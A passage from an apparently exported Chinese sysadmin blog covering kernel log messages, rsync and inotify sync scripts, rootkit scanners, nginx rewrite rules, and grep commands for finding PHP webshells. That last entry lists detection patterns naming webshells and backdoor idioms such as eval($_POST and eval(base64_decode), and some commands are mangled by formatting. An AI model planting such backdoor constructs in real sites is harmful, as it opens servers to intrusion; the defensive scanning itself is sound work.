<p><strong>NET:Nmessagessuppressed.</strong><br>服务器忽略了N个数据包.和上一条提示类似。服务器收到的数据包被认为是无用的垃圾数据数据。这类数据多是由攻击类的程序产生的。</p>
<p>这条提示如果N比较小的时候可以忽略。但如果经常或是长时间出现3位数据以上的这类提示，就很有可能是服务器受到了垃圾数据类的带宽攻击了。</p>
<p>◆一般类的提示</p>
<p><strong>UDP:badchecksum.From221.200.X.X:50279to218.62.X.X:1155ulen24</strong></p>
<p><strong>UDP:shortpacket:218.2.X.X:30723640/217to222.168.X.X:57596</strong></p>
<p><strong>218.26.131.XsentaninvalidICMPtype3,code13errortoabroadcast:0.1.0.4oneth0</strong></p>
<p>服务器收到了一个错误的数据包，分别为UDP校验和错误；过短的UDP数据包；一个错误的ICMP类型数据。这类信息一般情况下也是非法产生的。但一般问题不大可直接忽略。</p>
<p>◆一般类的提示</p>
<p><strong>kernel:conntrack_ftp:partial2272205426703+13</strong></p>
<p><strong>FTP_NAT:partialpacket2635716056/20in2635716048/2635716075</strong></p>
<p>服务器在维持一条FTP协议的连接时出错。这样的提示一般都可以直接忽略。网络通信严重问题!</p>
<p>&lt;/TDBGCOLOR=#F2F2F2&gt;&lt;/TABLECELLSPACING=1CELLPADDING=0WIDTH=&quot;80%&quot;BGCOLOR=#CCCCCC&gt;&lt;/PALIGN=CENTER&gt;<br>  <pre>NETDEVWATCHDOG:eth1:transmittimedouteth1:linkdowneth1:linkup,10Mbps,half-duplex,lpa0x0000eth2:linkup,100Mbps,full-duplex,lpa0x41E1settingfull-duplexbasedonMII#24linkpartnercapabilityof45e1</pre></p>
<p>这些提示是网络通信中出现严重问题时才会出现。故障基本和网络断线有关系。这几条提示分别代表的含意是某块网卡传送数据超时；网卡连接down；网卡连接up，连接速率为10/100Mbps，全/半双功。这里写到的最后三行的提示比较类似。出现这类提示时必须注意网络连接状况进行处理!!!</p>
<p>◆网络通信严重问题!</p>
<p><strong>NICLinkisUp100MbpsFullDuplex</strong></p>
<p>情况和kernel:eth1:linkup,…相同.指某块网卡适应的连接速率。一般认为没有说明哪个网卡down，只是连续出现网卡适应速率也是通信有问题。如果是网线正常的断接可以忽略这类的信息。</p>
<p>◆网络通信严重问题!</p>
<p><strong>eth0:Transmittimedout,status0000,PHYstatus786d,resetting…eth0:Resetnotcompleteyet.Tryingharder.</strong></p>
<p>第一条提示网卡关送数据失败.复位网卡.第二条提示网卡复位不成功….这些提示都属于严重的通信问题。</p>
<p>◆<strong>报警程序的提示</strong></p>
<p>0001##WMPCheckV001##2005-04-13_10:10:01Found.(ARPSpoofingsniffer)!IP:183MAC:50002##WMPCheckV001##2005-04-07_01:53:32Found.(MAC_incomplete)!IP:173mac_incomplete:1860003##WMPCheckV001##2005-04-17_16:25:11Found.(HIGH_synsent)!totl:4271SynSent:34900004##WMPCheckV001##20……</p>
<p>这是由报警程序所引起的提示.详细的信息需要用报警程序的客户端进行实时接收.详细情况请查看&quot;告警模块和日志&quot;。</p>
<p>◆基本无关</p>
<p><strong>keyboard:unknownscancodee05e</strong></p>
<p>键盘上接收到未定义的键值.如果经常出现.有可能是键盘有问题.linux对于比较特殊的键或是组合键,有时也会出这样的提示。要看一下服务器的键盘是不是被压住了.其它情况一般忽略。</p>
<p>◆基本无关</p>
<p><strong>usesobsolete(PF_INET,SOCK_PACKET)</strong></p>
<p>系统内核调用了一部分功能模块,在第一次调入时会出现.一般情况与使用调试工具有关.可直接忽略。</p>
<p>◆网络通信故障</p>
<p><strong>Neighbourtableoverflow.</strong></p>
<p>出现这个提示.一般都是因为局域网内有部分计算机被病毒感染.情况严重时会影响通信.必须处理内部网通信不正常的计算机。</p>
<p>◆网络通信故障</p>
<p><strong>eth1:Transmiterror,Txstatusregister82.Probablyaduplexmismatch.SeeDocumentation/networking/vortex.txtFlags;bus-master1,dirty9994190(14)current9994190(14)Transmitlist00000000vs.f7171580.0:@f7171200length800001e6status000101e61:@f7171240length8000008cstatus0001008c….</strong></p>
<p>这个提示是3com网卡特有的.感觉如果出现量不大的话也不会影响很严重.目前看维一的解决办法是更换服务器上的网卡。实在感觉3com的网卡有些问题…</p>
<p>◆服务器系统严重故障</p>
<p><strong>CPU0:TemperatureabovethresholdCPU0:Runninginmodulatedclockmode</strong></p>
<p>服务器CPU工作温度过高.必须排除硬件故障…</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kernel错误提示 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ssh端口从22改到其他端口后，rsync的用法]]></title>
      <url>/2012/11/28/ssh-e7-ab-af-e5-8f-a3-e4-bb-8e22-e6-94-b9-e5-88-b0-e5-85-b6-e4-bb-96-e7-ab-af-e5-8f-a3-e5-90-8e-ef-bc-8crsync-e7-9a-84-e7-94-a8-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>很多人都使用rsync的服务端+客户端的方式使用，为了方便期间使用rsync和ssh结合使用的方法同步文件：</p>
<p>rsync -avH –progress –files-from=test.txt  ‘-e ssh -p  11122’     <a href="app:ds:source" target="_blank" rel="external">source</a> directory/  root@192.168.1.11:<a href="mailto:root@192.168.1.11:destination" target="_blank" rel="external">destination</a> <a href="app:ds:directory" target="_blank" rel="external">directory</a>/</p>
<p>&nbsp;</p>
<p>如果端口是默认的22，直接rsync操作即可</p>
<p>&nbsp;</p>
<p>rsync -avH –progress –include-from=test.txt   <a href="app:ds:source" target="_blank" rel="external">source</a> directory/</p>
<p>root@192.168.1.11:<a href="mailto:root@192.168.1.11:destination" target="_blank" rel="external">destination</a> <a href="app:ds:directory" target="_blank" rel="external">directory</a>/</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[编译gevent-0.13.8出现：error: Setup script exited with error: command 'gcc' failed with exit status 1]]></title>
      <url>/2012/11/26/e7-bc-96-e8-af-91gevent-0-13-8-e5-87-ba-e7-8e-b0-ef-bc-9aerror-setup-script-exited-with-error-command-gcc-failed-with-exit-status-1.html</url>
      <content type="html"><![CDATA[<p>编译gevent-0.13.8出现：error: Setup script exited with error: command ‘gcc’ failed with exit status 1</p>
<p>解决方法： yum –y install python-devel&#160; libevent&#160; libevent-devel</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux上rootkits检测工具:Rootkit Hunter和Chkrootkit]]></title>
      <url>/2012/11/21/linux-e4-b8-8arootkits-e6-a3-80-e6-b5-8b-e5-b7-a5-e5-85-b7rootkit-hunter-e5-92-8cchkrootkit.html</url>
      <content type="html"><![CDATA[<p>转载：本文主要介绍linux上检测rootkit的两种工具: Rootkit Hunter和Chkrootkit.<br>Rootkit Hunter<br>中文名叫”Rootkit猎手”, 可以发现大约58个已知的rootkits和一些嗅探器和后门程序. 它通过执行一系列的测试脚本来确认你的机器是否已经感染rootkits. 比如检查rootkits使用的基本文件, 可执行二进制文件的错误文件权限, 检测内核模块等等. Rootkit Hunter由Michael Boelen开发, 是开源(GPL)软件.<br>安装Rootkit Hunter非常简单, 从网站下载软件包, 解压, 然后以root用户身份运行installer.sh脚本.<br>成功安装后, 你可以通过运行下面命令来检测你的机器是否已感染rootkit:</p>
<h1 id="rkhunter-c"><a href="#rkhunter-c" class="headerlink" title="rkhunter -c"></a>rkhunter -c</h1><p>二进制可执行文件rkhunter被安装到/usr/local/bin目录, 你需要以root身份来运行该程序. 程序运行后, 它主要执行下面一系列的测试:<br>1. MD5校验测试, 检测任何文件是否改动.<br>2. 检测rootkits使用的二进制和系统工具文件.<br>3. 检测特洛伊木马程序的特征码.<br>4. 检测大多常用程序的文件异常属性.<br>5. 执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台.<br>6. 扫描任何混杂模式下的接口和后门程序常用的端口.<br>7. 检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告.<br>8. 对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等.<br>完成上面检测后, 你的屏幕会显示扫描结果: 可能被感染的文件, 不正确的MD5校验文件和已被感染的应用程序.<br>在我的机器上, 扫描用了175秒. 缺省情况下, rkhunter对系统进行已知的一些检测. 但是你也可以通过使用’–scan-knownbad-files’来执行未知的错误检测:</p>
<h1 id="rkhunter-c-–scan-knownbad-files"><a href="#rkhunter-c-–scan-knownbad-files" class="headerlink" title="rkhunter -c –scan-knownbad-files"></a>rkhunter -c –scan-knownbad-files</h1><p>rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:</p>
<h1 id="rkhunter-–update"><a href="#rkhunter-–update" class="headerlink" title="rkhunter –update"></a>rkhunter –update</h1><p>当然最好是通过cron job定期执行上面的命令, 你需要用root用户添加下面命令到crontab文件:<br>59 23 1 <em> </em> echo “Rkhunter update check in progress”;/usr/local/bin/rkhunter –update<br>上面一行告诉cron程序在每月第一天的下午11:59分执行rkhunter数据库更新工作, 而且你的root用户会收到一封结果通知邮件.<br>Chkrootkit<br>Chkrootkit由Nelson Murilo和Klaus Steding Jessen开发. 与Rootkit Hunter程序不同的是, chrootkit不需要installer安装程序, 你只需解开软件包后执行chrootkit即可, 然后将对一些二进制文件进行一系列的测试, 除了与Rootkit Hunter相同的测试外, Chkrootkit还对一些重要的二进制文件进行检测, 比如搜索入侵者已更改日志文件的特征信息等等. 而且, 如果你想列出已经测试的所有项目, 你可以运行带有’-l’参数的命令:</p>
<h1 id="chkrootkit-l"><a href="#chkrootkit-l" class="headerlink" title="chkrootkit -l"></a>chkrootkit -l</h1><p>在测试过程中, 如果你想在屏幕上看到更多有用的信息, 执行下面命令:</p>
<h1 id="chkrootkit-x"><a href="#chkrootkit-x" class="headerlink" title="chkrootkit -x"></a>chkrootkit -x</h1><p>chkrootkit将在专家模式(expert mode)运行.<br>在Linux上组合使用Rootkit Hunter和Chkrootkit工具是检测rootkis不错的办法.</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Inotify + Rsync实现Linux文件实时同步，使用触发同步机制]]></title>
      <url>/2012/11/21/inotify-rsync-e5-ae-9e-e7-8e-b0linux-e6-96-87-e4-bb-b6-e5-ae-9e-e6-97-b6-e5-90-8c-e6-ad-a5-ef-bc-8c-e4-bd-bf-e7-94-a8-e8-a7-a6-e5-8f-91-e5-90-8c-e6-ad-a5-e6-9c-ba-e5-88-b6.html</url>
      <content type="html"><![CDATA[<p>公司一套系统的同步使用的donotify，不能实现子目录的实时同步，通过查资料，发现inotify可以实现子目录的实时同步，以下为笔记。<br>一、介绍<br>Inotify 是文件系统事件监控机制，作为 dnotify 的有效替代。dnotify 是较早内核支持的文件监控机制。Inotify 是一种强大的、细粒度的、异步的机制，它满足各种各样的文件监控需要，不仅限于安全和性能。<br>inotify 可以监视的文件系统事件包括：<br>IN_ACCESS，即文件被访问<br>IN_MODIFY，文件被 write<br>IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等<br>IN_CLOSE_WRITE，可写文件被 close<br>IN_CLOSE_NOWRITE，不可写文件被 close<br>IN_OPEN，文件被 open<br>IN_MOVED_FROM，文件被移走,如 mv<br>IN_MOVED_TO，文件被移来，如 mv、cp<br>IN_CREATE，创建新文件<br>IN_DELETE，文件被删除，如 rm<br>IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己<br>IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己<br>IN_UNMOUNT，宿主文件系统被 umount<br>IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)<br>IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO)<br>注：上面所说的文件也包括目录。</p>
<p>&nbsp;<br>二、为能在shell下使用inotify特性，需要安装inotify-tools<br>1、inotify-tools：The general purpose of this package is to allow inotify’s features to be used from within shell scripts.<br>下载地址：[url]<a href="http://inotify-tools.sourceforge.net/[/url" target="_blank" rel="external">http://inotify-tools.sourceforge.net/[/url</a>]<br>编译安装<br>./configure<br>make<br>make install<br>完成后，注意查看manpage，man inotify 、 man inotifywait</p>
<p>&nbsp;<br>inotifywait 仅执行阻塞，等待 inotify 事件。您可以监控任何一组文件和目录，或监控整个目录树（目录、子目录、子目录的子目录等等）。在 shell 脚本中使用 inotifywait。<br>inotifywatch 收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。<br>2、inotify的系统相关参数：<br>/proc interfaces<br>The following interfaces can be used to limit the amount of kernel memory consumed by inotify:<br>/proc/sys/fs/inotify/max_queued_events<br>The value in this file is used when an application calls inotify_init(2) to set an upper  limit  on  the number  of  events  that  can be queued to the corresponding inotify instance.  Events in excess of this limit are dropped, but an IN_Q_OVERFLOW event is always generated.<br>/proc/sys/fs/inotify/max_user_instances<br>This specifies an upper limit the number of inotify instances that can be created per real user ID.<br>/proc/sys/fs/inotify/max_user_watches<br>This specifies a limit the number of watches that can be associated with each inotify instance.</p>
<p>&nbsp;<br>3、inotifywait 相关的参数（更多，查看manpage）：<br>inotifywait<br>This command simply blocks for inotify events, making it appropriate for use in shell scripts. It can watch any set of files and directories, and can recursively watch entire directory trees.<br>-m, –monitor<br>Instead  of  exiting  after receiving a single event, execute indefinitely.  The default behaviour is to exit after the first event occurs.<br>-r, –recursive<br>Watch all subdirectories of any directories passed as arguments.  Watches will be set up recursively  to an  unlimited  depth.   Symbolic  links  are  not<br>traversed.  Newly created subdirectories will also be watched.<br>-q, –quiet<br>If specified ce, the program will be less verbose.  Specifically, it will not state when it  has  completed establishing all inotify watches.<br>-e &lt;event&gt;, –event &lt;event&gt;<br>Listen for specific event(s) ly.  The events which can be listened for are listed in the  EVENTS  section.  This option can be specified more than ce.  If omitted, all events are listened for. use“，”separate multi events</p>
<p>&nbsp;<br>三、使用<br>1.查看是否支持inotify，从kernel 2.6.13开始正式并入内核，RHEL5已经支持。<br>看看是否有 /proc/sys/fs/inotify/目录，以确定内核是否支持inotify<br>[root@RHEL5 Rsync]# ll /proc/sys/fs/inotify<br>total 0<br>-rw-r–r– 1 root root 0 Oct  9 09:36 max_queued_events<br>-rw-r–r– 1 root root 0 Oct  9 09:36 max_user_instances<br>-rw-r–r– 1 root root 0 Oct  9 09:36 max_user_watches<br>2.关于递归：<br>inotifywait<br>This command simply blocks for inotify events, making it appropriate for use in shell scripts. It can watch any set of files and directories, and can recursively watch entire directory trees.</p>
<p>&nbsp;<br>3.使用：</p>
<p>#!/bin/sh<br>src=/opt/webmail<br>des=/tmp<br>ip=192.168.7.192<br>/usr/local/bin/inotifywait -mrq –timefmt ‘%d/%m/%y %H:%M’ –format  ‘%T %w%f’<br>-e modify,delete,create,attrib<br>${src}<br>| while read  file<br>do<br>rsync -avz –delete –progress ${src} <a href="mailto:root@${ip}:${des" target="_blank" rel="external">root@${ip}:${des</a>} &amp;&amp;<br>echo “${file} was rsynced”<br>echo “—————————————————————————“<br>done<br>注：<br>当要排出同步某个目录时，为rsync添加–exculde=PATTERN参数，注意，路径是相对路径。详细查看man rsync<br>当要排除都某个目录的事件监控的处理时，为inotifywait添加–exclude或–excludei参数。详细查看man inotifywait<br>另：<br>/usr/local/bin/inotifywait -mrq –timefmt ‘%d/%m/%y %H:%M’ –format  ‘%T %w%f’<br>-e modify,delete,create,attrib<br>${src}<br>上面的命令返回的值类似于：<br>10/03/09 15:31 /wwwpic/1</p>
<p>这3个返回值做为参数传给read，关于此处，有人是这样写的：<br>inotifywait -mrq -e create,move,delete,modify $SRC | while read D E F;do</p>
<p>细化了返回值。</p>
<p>&nbsp;</p>
<p>&nbsp;<br>说明： 当文件系统发现指定目录下有如上的条件的时候就触发相应的指令，是一种主动告之的而非我用循环比较目录下的文件的异动，该程序在运行时，更改目录内的文件时系统内核会发送一个信号，这个信号会触发运行rsync命令，这时会同步源目录和目标目录。<br>–timefmt：指定输出时的输出格式<br>–format：  ‘%T %w%f’指定输出的格式，上面的输出类似于：12/10/08 06:34 /opt/webmail/dovecot-1.1.2/src/test/1</p>
<p>&nbsp;<br>小脚本，同步到多台主机：</p>
<p>使用rsync+inotify配置触发式(实时)远程同步</p>
<p>使用rsync+inotify配置触发式(实时)远程同步</p>
<p>2008-11-01 TsengYia#126.com</p>
<p>################################################################<br>系统环境：RHEL5 [ 2.6.18-8.el5xen ]<br>软件环境：<br>rsync-2.6.8-3.1<br>nfs-utils-1.0.9-16.el5<br>portmap-4.0-65.2.2.1<br>inotify-tools-3.13.tar.gz<br>—— [url]<a href="http://downloads.sourceforge.net/inotify-tools/inotify-tools-3.13.tar.gz?modtime=1199213676&amp;big_mirror=0[/url" target="_blank" rel="external">http://downloads.sourceforge.net/inotify-tools/inotify-tools-3.13.tar.gz?modtime=1199213676&amp;big_mirror=0[/url</a>]</p>
<p>目标功能：<br>源主机H1: 192.168.1.11/24<br>目标主机H2: 192.168.1.12/24</p>
<p>将H1主机中的开发数据(/var/devel/目录)，上传同步至H2主机的/backup/devel/h1/目录。——当源数据有文件或目录更新时，即时启动rsync同步进程。[基于安全性考虑，建议只在内部网络中使用]</p>
<p>################################################################<br>除inotify-tools(需要2.6.13以上内核的inotify功能支持)以外，其他软件均使用RHEL5系统自带的rpm包安装。</p>
<p>一、配置目标主机H2(发布NFS可写共享)</p>
<p>shell&gt; mkdir -p /backup/devel/h1/<br>shell&gt; vi /etc/exports<br>/backup/devel/h1    192.168.1.11(rw,no_root_squash)<br>shell&gt; service portmap start<br>shell&gt; service nfs start<br>shell&gt; chkconfig portmap<br>shell&gt; chkconfig nfs</p>
<p>如有必要，可以结合防火墙规则控制访问权限<br>shell&gt; iptables -I INPUT -p tcp –dport 111 -j DROP<br>shell&gt; iptables -I INPUT -p tcp –dport 111 -s 192.168.1.11 -j ACCEPT<br>shell&gt; iptables -I INPUT -p udp –dport 111 -j DROP<br>shell&gt; iptables -I INPUT -p udp –dport 111 -s 192.168.1.11 -j ACCEPT<br>二、配置源主机H1(上传备份发起端)</p>
<p>1、安装inotify-tools工具包<br>shell&gt; tar zxvf inotify-tools-3.13.tar.gz -C /usr/src/<br>shell&gt; cd /usr/src/inotify-tools-3.13<br>shell&gt; ./configure<br>shell&gt; make<br>shell&gt; make install<br>—— 可以使用man inotify、man inotifywait、man inotifywatch查看相关手册页。</p>
<p>2、挂载H2发布的备份目录<br>shell&gt; service portmap start<br>shell&gt; chkconfig portmap<br>shell&gt; mkdir -p /media/h2nfsdir/<br>shell&gt; vi /etc/fstab<br>192.168.0.12:/backup/devel/h1    /media/h2nfsdir    nfs    defaults,noexec    0 0<br>shell&gt; mount /media/h2nfsdir</p>
<p>3、编写触发同步脚本<br>shell&gt; vi /opt/h1-h2_inosync.sh</p>
<p>#!/bin/sh<br>SRC=/var/devel/<br>DST=/media/h2nfsdir/<br>INWT=/usr/local/bin/inotifywait<br>RSYNC=/usr/bin/rsync<br>$INWT -mrq -e create,move,delete,modify $SRC | while read D E F ; do<br>$RSYNC -aHqz –delete $SRC $DST<br>done<br>shell&gt; chkmod +x /opt/h1-h2_inosync.sh</p>
<p>4、每次开机自动运行监控脚本<br>shell&gt; echo “/opt/h1-h2_inosync.sh &amp;” &gt;&gt; /etc/rc.local<br>shell&gt; /opt/h1-h2_inosync.sh &amp;<br>三、测试实时同步<br>在源主机H1上，修改/var/devel/目录中的内容(如增、删、改文件，添加、移除目录等),<br>——同时在目标主机H2上，观察备份目录/backup/devel/h1/中内容的变化。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[LINUX下的PHP木马查询]]></title>
      <url>/2012/11/20/linux-e4-b8-8b-e7-9a-84php-e6-9c-a8-e9-a9-ac-e6-9f-a5-e8-af-a2.html</url>
      <content type="html"><![CDATA[<h1 id="find-name-“-php”-xargs-egrep-“phpspy-c99sh-milw0rm-eval-gunerpress-eval-base64-decoolcode-spider-bc”-gt-tmp-php-txt"><a href="#find-name-“-php”-xargs-egrep-“phpspy-c99sh-milw0rm-eval-gunerpress-eval-base64-decoolcode-spider-bc”-gt-tmp-php-txt" class="headerlink" title="find ./ -name “*.php” |xargs egrep “phpspy|c99sh|milw0rm|eval(gunerpress|eval(base64_decoolcode|spider_bc”&gt; /tmp/php.txt"></a>find ./ -name “*.php” |xargs egrep “phpspy|c99sh|milw0rm|eval(gunerpress|eval(base64_decoolcode|spider_bc”&gt; /tmp/php.txt</h1><h1 id="grep-r-–include-php-‘-a-z-eval-POST’-gt-tmp-eval-txt"><a href="#grep-r-–include-php-‘-a-z-eval-POST’-gt-tmp-eval-txt" class="headerlink" title="grep -r –include=*.php  ‘[^a-z]eval($_POST’ . &gt; /tmp/eval.txt"></a>grep -r –include=*.php  ‘[^a-z]eval($_POST’ . &gt; /tmp/eval.txt</h1><div># grep -r –include=<em>.php  ‘file_put_contents(.</em>$_POST[.<em>]);’ . &gt; /tmp/file_put_contents.txt</em></div><br><div></div><br><div># find ./ -name “.php” -type f -print0 | xargs -0 egrep “(phpspy|c99sh|milw0rm|eval(gzuncompress(base64_decoolcode|eval(base64_decoolcode|spider_bc|gzinflate)” | awk -F: ‘{print $1}’ | sort | uniq</div><br><div>查找最近一天被修改的PHP文件</div><br><div>#   find -mtime -1 -type f -name <em>.php</em></div><br><div>修改网站的权限</div><br><div># find -type f -name .php -exec chmod 444 {} ;</div><br><div># find ./ -type d -exec chmod 555{} ;</div>]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[nginx rewrite 参数和例子]]></title>
      <url>/2012/11/17/nginx-rewrite-e5-8f-82-e6-95-b0-e5-92-8c-e4-be-8b-e5-ad-90.html</url>
      <content type="html"><![CDATA[<p>推荐参考地址：<br>Mailing list ARChives 官方讨论区<br><a href="http://marc.info/?l=nginx" target="_blank" rel="external">http://marc.info/?l=nginx</a></p>
<p>Nginx 常见应用技术指南[Nginx Tips]<br><a href="http://bbs.linuxtone.org/thread-1685-1-1.html" target="_blank" rel="external">http://bbs.linuxtone.org/thread-1685-1-1.html</a></p>
<p><strong>本日志内容来自互联网和平日使用经验，整理一下方便日后参考。</strong></p>
<p><strong>正则表达式匹配，其中：</strong></p>
<div><br><br>1.  <em> ~ 为区分大小写匹配<br>2.  </em> ~<em> 为不区分大小写匹配<br>3.  </em> !~和!~<em>分别为区分大小写不匹配及不区分大小写不匹配<br></em></div><br><strong>文件及目录匹配，其中：</strong><br><div><br><br>1.   -f和!-f用来判断是否存在文件<br>2.  <em> -d和!-d用来判断是否存在目录<br>3.  </em> -e和!-e用来判断是否存在文件或目录<br>4.  <em> -x和!-x用来判断文件是否可执行<br></em></div><br><strong>flag标记有：</strong><br><div><br><br>1.   last 相当于Apache里的[L]标记，表示完成rewrite<br>2.  <em> break 终止匹配, 不再匹配后面的规则<br>3.  </em> redirect 返回302临时重定向 地址栏会显示跳转后的地址<br>4.  <em> permanent 返回301永久重定向 地址栏会显示跳转后的地址<br></em></div><br><strong>一些可用的全局变量有，可以用做条件判断(待补全)</strong><br><div><br><br>1.  $args<br>2.  $content_length<br>3.  $content_type<br>4.  $document_root<br>5.  $document_uri<br>6.  $host<br>7.  $http_user_agent<br>8.  $http_cookie<br>9.  $limit_rate<br>10.  $request_body_file<br>11.  $request_method<br>12.  $remote_addr<br>13.  $remote_port<br>14.  $remote_user<br>15.  $request_filename<br>16.  $request_uri<br>17.  $query_string<br>18.  $scheme<br>19.  $server_protocol<br>20.  $server_addr<br>21.  $server_name<br>22.  $server_port<br>23.  $uri<br></div><br><strong>结合QeePHP的例子</strong><br><div><br><br>1.  if (!-d $request_filename) {<br>2.  rewrite ^/([a-z-A-Z]+)/([a-z-A-Z]+)/?(.)$ /index.php?namespace=user&amp;amp;controller=$1&amp;amp;action=$2&amp;amp;$3 last;<br>3.  rewrite ^/([a-z-A-Z]+)/?$ /index.php?namespace=user&amp;amp;controller=$1 last;<br>4.  break;<br></div><br><strong>多目录转成参数</strong><br>abc.domian.com/sort/2 =&gt; abc.domian.com/index.php?act=sort&amp;name=abc&amp;id=2<br><div><br><br>1.  if ($host ~<em> (.</em>)/.domain/.com) {<br>2.  set $sub_name $1;<br>3.  rewrite ^/sort//(/d+)//?$ /index.php?act=sort&amp;cid=$sub_name&amp;id=$1 last;<br>4.  }<br></div><br><strong>目录对换</strong><br>/123456/xxxx -&gt; /xxxx?id=123456<br><div><br><br>1.  rewrite ^/(/d+)/(.+)/ /$2?id=$1 last;<br></div><br><strong>例如下面设定nginx在用户使用ie的使用重定向到/nginx-ie目录下：</strong><br><div><br><br>1.  if ($http_user_agent ~ MSIE) {<br>2.  rewrite ^(.<em>)$ /nginx-ie/$1 break;<br>3.  }<br></em></div><br><strong>目录自动加“/”</strong><br><div><br><br>1.  if (-d $request_filename){<br>2.  rewrite ^/(.)([^/])$ <a href="http://$host/$1$2/" target="_blank" rel="external">http://$host/$1$2/</a> permanent;<br>3.  }<br></div><br><strong>禁止htaccess</strong><br><div><br><br>1.  location ~//.ht {<br>2.  deny all;<br>3.  }<br></div><br><strong>禁止多个目录</strong><br><div><br><br>1.  location ~ ^/(cron|templates)/ {<br>2.  deny all;<br>3.  break;<br>4.  }<br></div><br><strong>禁止以/data开头的文件</strong><br>可以禁止/data/下多级目录下.log.txt等请求;<br><div><br><br>1.  location ~ ^/data {<br>2.  deny all;<br>3.  }<br></div><br><strong>禁止单个目录</strong><br>不能禁止.log.txt能请求<br><div><br><br>1.  location /searchword/cron/ {<br>2.  deny all;<br>3.  }<br></div><br><strong>禁止单个文件</strong><br><div><br><br>1.  location ~ /data/sql/data.sql {<br>2.  deny all;<br>3.  }<br></div><br><strong>给favicon.ico和robots.txt设置过期时间;</strong><br>这里为favicon.ico为99天,robots.txt为7天并不记录404错误日志<br><div><br><br>1.  location ~(favicon.ico) {<br>2.  log_not_found off;<br>3.  expires 99d;<br>4.  break;<br>5.  }<br>6.7.  location ~(robots.txt) {<br>8.  log_not_found off;<br>9.  expires 7d;<br>10.  break;<br>11.  }<br></div><br><strong>设定某个文件的过期时间;这里为600秒，并不记录访问日志</strong><br><div><br><br>1.  location ^~ /html/scripts/loadhead_1.js {<br>2.  access_log   off;<br>3.  root /opt/lampp/htdocs/web;<br>4.  expires 600;<br>5.  break;<br>6.  }<br></div><br><strong>文件反盗链并设置过期时间</strong><br>这里的return 412 为自定义的http状态码，默认为403，方便找出正确的盗链的请求<br>“rewrite ^/ <a href="http://leech.c1gstudio.com/leech.gif;”显示一张防盗链图片" target="_blank" rel="external">http://leech.c1gstudio.com/leech.gif;”显示一张防盗链图片</a><br>“access_log off;”不记录访问日志，减轻压力<br>“expires 3d”所有文件3天的浏览器缓存<br><div><br><br>1.  location ~<em> ^.+/.(jpg|jpeg|gif|png|swf|rar|zip|css|js)$ {<br>2.  valid_referers none blocked </em>.c1gstudio.com <em>.c1gstudio.net localhost 208.97.167.194;<br>3.  if ($invalid_referer) {<br>4.  rewrite ^/ <a href="http://leech.c1gstudio.com/leech.gif" target="_blank" rel="external">http://leech.c1gstudio.com/leech.gif</a>;<br>5.  return 412;<br>6.  break;<br>7.  }<br>8.  access_log   off;<br>9.  root /opt/lampp/htdocs/web;<br>10.  expires 3d;<br>11.  break;<br>12.  }<br></em></div><br><strong>只充许固定ip访问网站，并加上密码</strong><br><div><br><br>1.  root  /opt/htdocs/www;<br>2.  allow   208.97.167.194;<br>3.  allow   222.33.1.2;<br>4.  allow   231.152.49.4;<br>5.  deny    all;<br>6.  auth_basic “C1G_ADMIN”;<br>7.  auth_basic_user<em>file htpasswd;<br></em></div><br><strong>将多级目录下的文件转成一个文件，增强seo效果</strong><br>/job-123-456-789.html 指向/job/123/456/789.html<br><div><br><br>1.  rewrite ^/job-([0-9]+)-([0-9]+)-([0-9]+)/.html$ /job/$1/$2/jobshow$3.html last;<br></div><br><strong>将根目录下某个文件夹指向2级目录</strong><br>如/<strong>shanghai</strong>job/ 指向 /area/<strong>shanghai</strong>/<br>如果你将last改成permanent，那么浏览器地址栏显是/location/shanghai/<br><div><br><br>1.  rewrite ^/([0-9a-z]+)job/(.)$ /area/$1/$2 last;<br></div><br>上面例子有个问题是访问/shanghai 时将不会匹配<br><div><br><br>1.  rewrite ^/([0-9a-z]+)job$ /area/$1/ last;<br>2.  rewrite ^/([0-9a-z]+)job/(.<em>)$ /area/$1/$2 last;<br></em></div><br>这样/shanghai 也可以访问了，但页面中的相对链接无法使用，<br>如./list_1.html真实地址是/area/shanghia/list_1.html会变成/list_1.html,导至无法访问。<br><br>那我加上自动跳转也是不行咯<br>(-d $request_filename)它有个条件是必需为真实目录，而我的rewrite不是的，所以没有效果<br><div><br><br>1.  if (-d $request_filename){<br>2.  rewrite ^/(.)([^/])$ <a href="http://$host/$1$2/" target="_blank" rel="external">http://$host/$1$2/</a> permanent;<br>3.  }<br></div><br>知道原因后就好办了，让我手动跳转吧<br><div><br><br>1.  rewrite ^/([0-9a-z]+)job$ /$1job/ permanent;<br>2.  rewrite ^/([0-9a-z]+)job/(.<em>)$ /area/$1/$2 last;<br></em></div><br><strong>文件和目录不存在的时候重定向：</strong><br><div><br><br>1.  if (!-e $request_filename) {<br>2.  proxy_pass <a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>;<br>3.  }<br></div><br><strong>域名跳转</strong><br><div><br><br>1.  server<br>2.  {<br>3.  listen       80;<br>4.  server_name  jump.c1gstudio.com;<br>5.  index index.html index.htm index.php;<br>6.  root  